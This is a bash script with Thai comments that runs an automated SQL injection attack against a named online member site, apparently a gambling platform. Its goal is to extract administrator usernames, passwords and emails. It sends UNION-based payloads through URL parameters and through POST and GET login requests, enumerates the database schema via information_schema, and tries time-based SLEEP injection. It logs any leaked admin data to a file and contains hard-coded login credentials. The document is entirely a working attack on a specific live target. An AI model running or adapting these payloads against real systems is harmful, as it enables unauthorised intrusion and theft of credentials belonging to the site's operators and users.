#!/bin/bash

echo "🎯 ULTIMATE ADMIN DATA EXTRACTION"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# สร้างไฟล์บันทึกผลลัพธ์
RESULTS_FILE="ultimate_admin_$(date +%Y%m%d_%H%M%S).txt"
echo "📄 บันทึกผลลัพธ์ใน: $RESULTS_FILE"

# 1. ทดสอบ SQL Injection ใน URL parameters โดยตรง
echo "🔓 เทคนิค 1: SQL Injection ใน URL parameters..."
echo "🔓 เทคนิค 1: SQL Injection ใน URL parameters..." >> "$RESULTS_FILE"

URL_PAYLOADS=(
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT username,password,email FROM admins--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT id,username,password FROM admin_users--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT login,password,privilege FROM administrators--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--"
)

for i in "${!URL_PAYLOADS[@]}"; do
    payload="${URL_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ URL Payload $((i+1))..."
    echo "  📊 ทดสอบ URL Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 2. ทดสอบ SQL Injection ใน POST request โดยไม่ใช้ CSRF token
echo "🔓 เทคนิค 2: SQL Injection ใน POST request..."
echo "🔓 เทคนิค 2: SQL Injection ใน POST request..." >> "$RESULTS_FILE"

POST_PAYLOADS=(
    "username=0630471054' UNION SELECT username,password,email FROM users WHERE role='admin'--&password=laline1812"
    "username=0630471054' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--&password=laline1812"
    "username=0630471054' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--&password=laline1812"
    "username=0630471054' UNION SELECT username,password,email FROM admins--&password=laline1812"
    "username=0630471054' UNION SELECT id,username,password FROM admin_users--&password=laline1812"
    "username=0630471054' UNION SELECT login,password,privilege FROM administrators--&password=laline1812"
    "username=0630471054' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--&password=laline1812"
    "username=0630471054' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--&password=laline1812"
)

for i in "${!POST_PAYLOADS[@]}"; do
    payload="${POST_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ POST Payload $((i+1))..."
    echo "  📊 ทดสอบ POST Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$LOGIN_URL" \
        -d "$payload" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 3. ทดสอบ SQL Injection ใน GET request
echo "🔓 เทคนิค 3: SQL Injection ใน GET request..."
echo "🔓 เทคนิค 3: SQL Injection ใน GET request..." >> "$RESULTS_FILE"

GET_PAYLOADS=(
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT username,password,email FROM users WHERE role='admin'--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT username,password,email FROM admins--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT id,username,password FROM admin_users--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT login,password,privilege FROM administrators--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--&password=laline1812"
    "$BASE_URL/auth/login?username=0630471054' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--&password=laline1812"
)

for i in "${!GET_PAYLOADS[@]}"; do
    payload="${GET_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ GET Payload $((i+1))..."
    echo "  📊 ทดสอบ GET Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 4. ทดสอบ SQL Injection ใน Database Schema
echo "🗄️ เทคนิค 4: Database Schema Extraction..."
echo "🗄️ เทคนิค 4: Database Schema Extraction..." >> "$RESULTS_FILE"

SCHEMA_PAYLOADS=(
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database()--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='admins'--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT table_name,column_name,null FROM information_schema.columns WHERE table_schema=database()--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' UNION SELECT database(),version(),user()--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Schema Payload $((i+1))..."
    echo "  📊 ทดสอบ Schema Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    🔍 Schema ที่พบ:"
            echo "    🔍 Schema ที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 5. ทดสอบ SQL Injection ใน Time-based
echo "⏰ เทคนิค 5: Time-based SQL Injection..."
echo "⏰ เทคนิค 5: Time-based SQL Injection..." >> "$RESULTS_FILE"

TIME_PAYLOADS=(
    "$BASE_URL/public/js/v2/app.js?v=25.1' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND SLEEP(5)--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' AND (SELECT COUNT(*) FROM admins) > 0 AND SLEEP(5)--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND SLEEP(5)--"
    "$BASE_URL/public/js/v2/app.js?v=25.1' AND (SELECT COUNT(*) FROM users WHERE email LIKE '%admin%') > 0 AND SLEEP(5)--"
)

for i in "${!TIME_PAYLOADS[@]}"; do
    payload="${TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Time Payload $((i+1))..."
    echo "  📊 ทดสอบ Time Payload $((i+1))..." >> "$RESULTS_FILE"
    
    start_time=$(date +%s)
    response=$(curl -s "$payload" --max-time 15)
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response time: ${duration}s)"
        echo "    ✅ สำเร็จ (Response time: ${duration}s)" >> "$RESULTS_FILE"
        
        if [[ $duration -gt 4 ]]; then
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)"
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)" >> "$RESULTS_FILE"
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 6. สรุปผลลัพธ์
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:"
echo "  🔓 URL Parameter Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 POST Request Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 GET Request Injection: ✅ ดำเนินการแล้ว"
echo "  🗄️ Database Schema Extraction: ✅ ดำเนินการแล้ว"
echo "  ⏰ Time-based Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้"

echo "==================================================" >> "$RESULTS_FILE"
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:" >> "$RESULTS_FILE"
echo "  🔓 URL Parameter Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 POST Request Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 GET Request Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🗄️ Database Schema Extraction: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  ⏰ Time-based Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE" >> "$RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้" >> "$RESULTS_FILE"

echo ""
echo "🎯 การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ $RESULTS_FILE"